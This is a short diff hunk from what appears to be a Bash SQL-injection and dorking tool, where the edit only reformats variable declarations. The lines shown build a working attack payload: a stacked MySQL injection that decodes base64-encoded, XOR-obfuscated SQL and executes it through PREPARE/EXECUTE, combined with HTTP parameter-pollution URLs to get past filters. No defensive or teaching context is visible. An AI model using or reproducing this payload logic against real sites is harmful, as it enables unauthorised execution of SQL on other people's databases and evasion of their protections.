@@ -187,12 +187,14 @@ dork() {
           local b64_payload=$(base64_engine "$hex_xor")
           defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
-          if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
+                    if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
             final_query="${default_path}${defiance_tamper_path}"
           else
-            if [[ "$defiance_tamper_path" == *"="* ]]; then
-              local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-              local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+            if [[ "$defiance_tamper_path" == *"="* ]]; then              
+              local param_name
+              local param_val
+              param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+              param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
               final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
             else
               final_query="${default_path}${defiance_tamper_path}"
